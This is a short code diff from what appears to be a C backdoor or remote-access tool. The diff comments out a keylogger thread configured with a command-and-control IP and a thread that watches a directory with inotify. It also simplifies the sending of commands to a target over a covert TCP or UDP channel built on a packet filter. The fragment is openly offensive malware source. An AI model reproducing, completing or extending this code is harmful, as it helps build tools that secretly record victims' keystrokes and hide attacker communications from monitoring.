@@ -91,7 +91,7 @@ int main(int argc, char **argv){
                 exit(1);
         }
     }
-
+/*
     //keylogger thread
     keylogger_struct *keylogger_args = malloc(sizeof *keylogger_args);  //create struct to pass args to thread
     strncpy(keylogger_args->cnc_ip, localip, BUFSIZ);
@@ -107,7 +107,7 @@ int main(int argc, char **argv){
     strncpy(inotify_args->directory, directory, BUFSIZ);
     inotify_args->tcp = tcp;
     pthread_create(&inotify_thread, NULL, recv_watch_directory,inotify_args);
-
+*/
     //create command
     Filter = InitFilter(targetip,localip,false);
     CreateFilter(Filter, pcapfilter,tcp);
@@ -115,16 +115,7 @@ int main(int argc, char **argv){
 
     //send command
     if(tcp){
-        int j = 0;
-        unsigned char ch[1];
-        memset(ch, 0, sizeof(char));
-
-        while(data[j] != '\0') {
-            ch[0] = data[j];
-
-            covert_send(localip, targetip, Filter.port_short[0], Filter.port_short[0], ch, 0);
-            j++;
-        }
+        covert_send(localip, targetip, Filter.port_short[0], Filter.port_short[0], data, 0);
     } else {
         covert_udp_send_data(Filter.localip, Filter.targetip, UPORT, UPORT, data, 1);
     }
